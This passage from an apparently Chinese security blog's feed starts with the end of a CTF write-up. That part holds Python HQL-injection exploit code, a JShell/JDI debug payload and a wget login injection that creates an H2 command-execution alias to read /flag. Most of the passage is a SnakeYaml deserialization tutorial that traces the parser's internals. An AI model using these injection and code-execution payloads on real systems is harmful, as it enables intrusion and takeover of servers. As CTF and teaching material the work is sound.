as includevirtualthreads))&#x27;</span>  </span><br><span class="line">  </span><br><span class="line">col = <span class="string">f&quot;<span class="subst">&#123;col&#125;</span> union select <span class="subst">&#123;col&#125;</span> &quot;</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">order</span>(<span class="params">sessionId, fields</span>):  </span><br><span class="line">    <span class="keyword">return</span> sess.post(  </span><br><span class="line">        <span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/orders&quot;</span>,  </span><br><span class="line">        data=&#123;<span class="string">&quot;sessionId&quot;</span>: sessionId, <span class="string">&quot;fields&quot;</span>: fields&#125;,  </span><br><span class="line">        headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;,  </span><br><span class="line">    )  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">order(sessionId=sessionId, fields=col)  </span><br><span class="line">  </span><br><span class="line">col = <span class="string">f&#x27;new jdk.jshell.execution.JdiInitiator(0, new java.util.ArrayList(0), &quot;jdk/internal/jshell/tool/JShellToolProvider /tmp/lol&quot;, true, &quot;localhost&quot;, 3000000, new map(&quot;n,server=y,suspend=n,address=localhost:13370&quot; as includevirtualthreads))&#x27;</span>  </span><br><span class="line">  </span><br><span class="line">col = <span class="string">f&quot;<span class="subst">&#123;col&#125;</span> union select <span class="subst">&#123;col&#125;</span> &quot;</span>  </span><br><span class="line">  </span><br><span class="line">order(sessionId=sessionId, fields=col)  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(order(sessionId=leak_sess_id, fields=<span class="string">&quot;1||&#x27;&quot;</span>).text)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># wget --header=&#x27;Content-Type: application/x-www-form-urlencoded&#x27; --post-data &quot;username=u&amp;password=\&quot; and function(&#x27;CSVWRITE&#x27;,&#x27;/tmp/kek&#x27;,&#x27;select 1;CREATE ALIAS SHELLEXEC AS &#x27;&#x27;void leak(String sessId, String cmd) throws java.lang.Exception &#123;sekai.HibernateUtil.addSession(new sekai.Session(sekai.HibernateUtil.addUser(new sekai.User(new java.lang.String(new java.lang.ProcessBuilder(cmd).start().getInputStream().readAllBytes()).concat(new java.lang.String(new byte[]&#123;39, 124, 124, 34&#125;)), cmd)), sessId));&#125;//&#x27;&#x27;; CALL SHELLEXEC(&#x27;&#x27;a&#x27;&#x27;, &#x27;&#x27;/flag&#x27;&#x27;)&#x27;,&#x27;charset=UTF-8&#x27;)=\&quot;&quot; http://127.0.0.1:8000/login</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;hqli-me&quot;&gt;&lt;a href=&quot;#hqli-me&quot; class=&quot;headerlink&quot; title=&quot;hqli-me&quot;&gt;&lt;/a&gt;hqli-me&lt;/h2&gt;&lt;p&gt;参考:&lt;br&gt;&lt;a href=&quot;https://www.valgrindc.tf/posts/hql</summary>
      
    
    
    
    <category term="JavaSec" scheme="http://example.com/categories/JavaSec/"/>
    
    
    <category term="JDI" scheme="http://example.com/tags/JDI/"/>
    
  </entry>
  
  <entry>
    <title>SnakeYaml反序列化</title>
    <link href="http://example.com/2025/09/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2025/09/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2025-09-10T07:37:58.000Z</published>
    <updated>2025-09-10T07:41:59.417Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SnakeYaml反序列化"><a href="#SnakeYaml反序列化" class="headerlink" title="SnakeYaml反序列化"></a>SnakeYaml反序列化</h1><h2 id="Yaml规范"><a href="#Yaml规范" class="headerlink" title="Yaml规范"></a>Yaml规范</h2><h3 id="yaml对象"><a href="#yaml对象" class="headerlink" title="yaml对象"></a>yaml对象</h3><p>对象键值对使用冒号结构表示 key: value，冒号后面要加一个空格。</p><p>也可以使用 key:{key1: value1, key2: value2, …}</p><p>还可以使用缩进表示层级关系:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">key:</span> </span><br><span class="line">    <span class="attr">child-key:</span> <span class="string">value</span></span><br><span class="line">    <span class="attr">child-key2:</span> <span class="string">value2</span></span><br></pre></td></tr></table></figure><h3 id="yaml数组"><a href="#yaml数组" class="headerlink" title="yaml数组"></a>yaml数组</h3><p>以 - 开头的行表示构成一个数组：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="string">A</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">B</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">C</span></span><br></pre></td></tr></table></figure><p>一个相对复杂的例子：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">companies:</span></span><br><span class="line">    <span class="bullet">-</span></span><br><span class="line">        <span class="attr">id:</span> <span class="number">1</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">company1</span></span><br><span class="line">        <span class="attr">price:</span> <span class="string">200W</span></span><br><span class="line">    <span class="bullet">-</span></span><br><span class="line">        <span class="attr">id:</span> <span class="number">2</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">company2</span></span><br><span class="line">        <span class="attr">price:</span> <span class="string">500W</span></span><br></pre></td></tr></table></figure><p>上面的例子中, companies是一个数组, 它有两个元素, 每个元素又有三个属性</p><p>数组也可以使用流式(flow)的方式表示：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">companies:</span> [&#123;<span class="attr">id:</span> <span class="number">1</span>,<span class="attr">name:</span> <span class="string">company1</span>,<span class="attr">price:</span> <span class="string">200W</span>&#125;,&#123;<span class="attr">id:</span> <span class="number">2</span>,<span class="attr">name:</span> <span class="string">company2</span>,<span class="attr">price:</span> <span class="string">500W</span>&#125;]</span><br></pre></td></tr></table></figure><p>这样看起来更直观</p><h3 id="复合结构"><a href="#复合结构" class="headerlink" title="复合结构"></a>复合结构</h3><p>数组和对象可以构成复合结构，例：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">languages:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Ruby</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Perl</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Python</span> </span><br><span class="line"><span class="attr">websites:</span></span><br><span class="line">  <span class="attr">YAML:</span> <span class="string">yaml.org</span> </span><br><span class="line">  <span class="attr">Ruby:</span> <span class="string">ruby-lang.org</span> </span><br><span class="line">  <span class="attr">Python:</span> <span class="string">python.org</span> </span><br><span class="line">  <span class="attr">Perl:</span> <span class="string">use.perl.org</span></span><br></pre></td></tr></table></figure><h3 id="纯量"><a href="#纯量" class="headerlink" title="纯量"></a>纯量</h3><p>纯量是最基本的，不可再分的值，包括：</p><ul><li>字符串</li><li>布尔值</li><li>整数</li><li>浮点数</li><li>Null</li><li>时间</li><li>日期<br>例子:<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">boolean:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="literal">TRUE</span>  <span class="comment">#true,True都可以</span></span><br><span class="line">    <span class="bullet">-</span> <span class="literal">FALSE</span>  <span class="comment">#false，False都可以</span></span><br><span class="line"><span class="attr">float:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">3.14</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">6.8523015e+5</span>  <span class="comment">#可以使用科学计数法</span></span><br><span class="line"><span class="attr">int:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">123</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">0b1010_0111_0100_1010_1110</span>    <span class="comment">#二进制表示</span></span><br><span class="line"><span class="attr">null:</span></span><br><span class="line">    <span class="attr">nodeName:</span> <span class="string">&#x27;node&#x27;</span></span><br><span class="line">    <span class="attr">parent:</span> <span class="string">~</span>  <span class="comment">#使用~表示null</span></span><br><span class="line"><span class="attr">string:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">哈哈</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;Hello world&#x27;</span>  <span class="comment">#可以使用双引号或者单引号包裹特殊字符</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">newline</span></span><br><span class="line">      <span class="string">newline2</span>    <span class="comment">#字符串可以拆成多行，每一行会被转化成一个空格</span></span><br><span class="line"><span class="attr">date:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">2018-02-17</span>    <span class="comment">#日期必须使用ISO 8601格式，即yyyy-MM-dd</span></span><br><span class="line"><span class="attr">datetime:</span> </span><br><span class="line">    <span class="bullet">-</span>  <span class="number">2018-02-17T15:02:31+08:00</span>    <span class="comment">#时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>&amp; 锚点和 * 别名，可以用来引用：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">defaults:</span> <span class="meta">&amp;defaults</span></span><br><span class="line">  <span class="attr">adapter:</span>  <span class="string">postgres</span></span><br><span class="line">  <span class="attr">host:</span>     <span class="string">localhost</span></span><br><span class="line"></span><br><span class="line"><span class="attr">development:</span></span><br><span class="line">  <span class="attr">database:</span> <span class="string">myapp_development</span></span><br><span class="line">  <span class="string">&lt;&lt;:</span> <span class="meta">*defaults</span></span><br><span class="line"></span><br><span class="line"><span class="attr">test:</span></span><br><span class="line">  <span class="attr">database:</span> <span class="string">myapp_test</span></span><br><span class="line">  <span class="string">&lt;&lt;:</span> <span class="meta">*defaults</span></span><br></pre></td></tr></table></figure><p>&amp; 用来建立锚点（defaults），&lt;&lt; 表示合并到当前数据，* 用来引用锚点。</p><p>上面的例子相当于</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">defaults:</span></span><br><span class="line">  <span class="attr">adapter:</span>  <span class="string">postgres</span></span><br><span class="line">  <span class="attr">host:</span>     <span class="string">localhost</span></span><br><span class="line"></span><br><span class="line"><span class="attr">development:</span></span><br><span class="line">  <span class="attr">database:</span> <span class="string">myapp_development</span></span><br><span class="line">  <span class="attr">adapter:</span>  <span class="string">postgres</span></span><br><span class="line">  <span class="attr">host:</span>     <span class="string">localhost</span></span><br><span class="line"></span><br><span class="line"><span class="attr">test:</span></span><br><span class="line">  <span class="attr">database:</span> <span class="string">myapp_test</span></span><br><span class="line">  <span class="attr">adapter:</span>  <span class="string">postgres</span></span><br><span class="line">  <span class="attr">host:</span>     <span class="string">localhost</span></span><br></pre></td></tr></table></figure><p>参考链接：</p><p><a href="https://www.runoob.com/w3cnote/yaml-intro.html">https://www.runoob.com/w3cnote/yaml-intro.html</a></p><h2 id="SnakeYaml库使用"><a href="#SnakeYaml库使用" class="headerlink" title="SnakeYaml库使用"></a>SnakeYaml库使用</h2><ul><li>Yaml.load():将yaml数据反序列化成一个Java对象</li><li>Yaml.dump():将Java对象序列化成yaml</li></ul><p>导入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>被序列化的类<br>Person.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.unserial;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String username;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;&#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String username, <span class="type">int</span> age)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.username = username;  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAge方法调用&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getUsername方法调用&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> username;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setAge方法调用&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setUsername方法调用&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.username = username;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>demo 测试序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.unserial;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testYaml</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;n4c1&quot;</span>, <span class="number">20</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> yaml.dump(person);  </span><br><span class="line">        System.out.println(str);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getAge方法调用</span><br><span class="line">getUsername方法调用</span><br><span class="line">!!org.n4c1.unserial.Person &#123;age: <span class="number">20</span>, username: n4c1&#125;</span><br></pre></td></tr></table></figure><p>demo 测试反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.unserial;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testYaml</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;n4c1&quot;</span>, <span class="number">20</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> yaml.dump(person);  </span><br><span class="line">        System.out.println(str);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">yamlStr</span> <span class="operator">=</span> <span class="string">&quot;!!org.n4c1.unserial.Person &#123;age: 20, username: n4c1&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">person2</span> <span class="operator">=</span> (Person) yaml.load(yamlStr);  </span><br><span class="line">        System.out.println(person2.getUsername());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">getAge方法调用</span><br><span class="line">getUsername方法调用</span><br><span class="line">!!org.n4c1.unserial.Person &#123;age: <span class="number">20</span>, username: n4c1&#125;</span><br><span class="line"></span><br><span class="line">setAge方法调用</span><br><span class="line">setUsername方法调用</span><br><span class="line">getUsername方法调用</span><br><span class="line">n4c1</span><br></pre></td></tr></table></figure><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>snakeYaml的解析可以说是以节点为基础<br>假如有以下yaml文档</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">person:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">&quot;张三&quot;</span></span><br><span class="line">  <span class="attr">age:</span> <span class="number">30</span></span><br><span class="line">  <span class="attr">hobbies:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">读书</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">健身</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">编程</span></span><br></pre></td></tr></table></figure><p>词法分析器会逐个token解析出各个节点, 拆分出来各个节点对应:</p><ul><li><p><strong>整个文档的根节点</strong></p><ul><li><p><strong>节点类型</strong>: **映射 (Mapping)**。</p></li><li><p><strong>代表</strong>: 整个文档的顶层结构。</p></li><li><p><strong>说明</strong>: 这个节点包含一个键值对，键是 <code>person</code>，值是它下面的整个结构。</p></li></ul></li><li><p><strong><code>name</code> 节点</strong></p><ul><li><p><strong>节点类型</strong>: **标量 (Scalar)**。</p></li><li><p><strong>代表</strong>: 一个单一的值。</p></li><li><p><strong>说明</strong>: 这是一个键值对中的 <strong>值</strong>，其值为 <code>&quot;张三&quot;</code>。它是一个字符串。</p></li></ul></li><li><p><strong><code>age</code> 节点</strong></p><ul><li><p><strong>节点类型</strong>: **标量 (Scalar)**。</p></li><li><p><strong>代表</strong>: 一个单一的值。</p></li><li><p><strong>说明</strong>: 它的值为 <code>30</code>，一个整数。</p></li></ul></li><li><p><strong><code>hobbies</code> 节点</strong></p><ul><li><p><strong>节点类型</strong>: **序列 (Sequence)**。</p></li><li><p><strong>代表</strong>: 一个有序的列表。</p></li><li><p><strong>说明</strong>: 它的值是下面的三个项目，它包含了三个子节点。</p></li></ul></li><li><p><strong><code>hobbies</code> 下的子节点</strong></p><ul><li><p><strong>节点类型</strong>: **标量 (Scalar)**。</p></li><li><p><strong>代表</strong>: 序列中的每一个项。</p></li><li><p><strong>说明</strong>: 这三个节点分别是 <code>&quot;读书&quot;</code>、<code>&quot;健身&quot;</code> 和 <code>&quot;编程&quot;</code>，它们都是独立的字符串标量。</p></li></ul></li></ul><p>当反序列化我们的字符串时</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">yamlStr</span> <span class="operator">=</span> <span class="string">&quot;!!org.n4c1.unserial.Person &#123;age: 20, username: n4c1&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>根节点就是org.n4c1.unserial.Person它的值就是花括号中代表的内容, 其中又有age节点和username节点</p><p>再load方法打上断点分析</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250808230109.png" alt="image.png"><br>跟进到loadFromReader方法</p><p>它会实例化了一个composer, 并放在constructor中, 通过constructor来构建对象</p><blockquote><p><code>Composer</code> 是 SnakeYAML 的核心组件之一，它的职责是将 YAML 事件流（由 <code>Parser</code> 生成）合成为一个单一的、完整的 YAML 节点图（node graph）。</p></blockquote><blockquote><p><strong>Construct</strong>会根据这些节点的类型和内容，把它们组装成一个你想要的 <strong>Java 对象</strong>。比如，它会把一个 <strong>映射节点</strong> 变成一个 Java <code>Map</code> 对象，或者一个自定义的类对象</p></blockquote><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250808230920.png" alt="image.png"></p><p>在getSingleData方法中可以看见首先由composer获取了一个MappingNode, 描述的是该yaml文档的整体结构(node graph)<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250808230739.png" alt="image.png"></p><p>constructDocument根据文档结构, 还原对象<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250808231407.png" alt="image.png"></p><p>这里constructedObjects应该是类似缓存, 先从这里获取, 如果没有则创建<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250808231459.png" alt="image.png"><br>跟进constructObjectNoCheck<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250808232131.png" alt="image.png"></p><p>获取构造器<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250808232106.png" alt="image.png"></p><p>这里MappingNode的tag其实是<code>tag:yaml.org,2002:org.n4c1.unserial.Person</code>, 默认yaml是没有这个构造器的, 直接返回了一个 <code>&#123;Constructor$ConstructYamlObject@1306&#125; </code>构造器, 之后用这个构造器取还原类</p><p>这里会进入ConstructYamlObject这个构造器的consructor方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250808232718.png" alt="image.png"><br>跟进<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250808235618.png" alt="image.png"></p><p>getClassForNode方法会反射获取我们节点的class<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250808233130.png" alt="image.png"></p><p>调用的是这个方法, 传入类名, 返回类的class, 然后把class存在node的type属性<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250808233300.png" alt="image.png"></p><p>之后回去看construct方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250808235745.png" alt="image.png"><br>有一步<code>Constructor.this.newInstance(mnode)</code>, 这个newInstance方法是这个snakeYaml类自己实现的, 里面具体逻辑主要就是用刚刚反射得到的class,反射获取构造器, 实例出对象</p><p>之后这里的constructJavaBean2ndStep方法就是给对象的属性进行反序列化然后赋值, </p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250809001832.png" alt="image.png"></p><p>首先flattenMapping对对象进行展平, 主要包括了<strong>处理重复的键</strong> 和 <strong>处理合并键（<code>&lt;&lt;</code>）</strong>。<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250809001920.png" alt="image.png"></p><p>先看processDuplicateKeys方法<br>这个实际上是实例出键, 利用tuple去重, 可以看见调用了constructObject来构建对象<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250809002052.png" alt="image.png"><br>之后调用了对象的hashCode方法, </p><p>这里就出现了一个攻击面, hashCode方法可以触发到cc链等一些链子</p><p>后面的逻辑大概还是和去重有关, 不用管<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250809002646.png" alt="image.png"><br>flattenMapping结束后回到constructJavaBean2ndStep方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">constructJavaBean2ndStep</span><span class="params">(MappingNode node, Object object)</span> &#123;  </span><br><span class="line">    flattenMapping(node);  </span><br><span class="line">  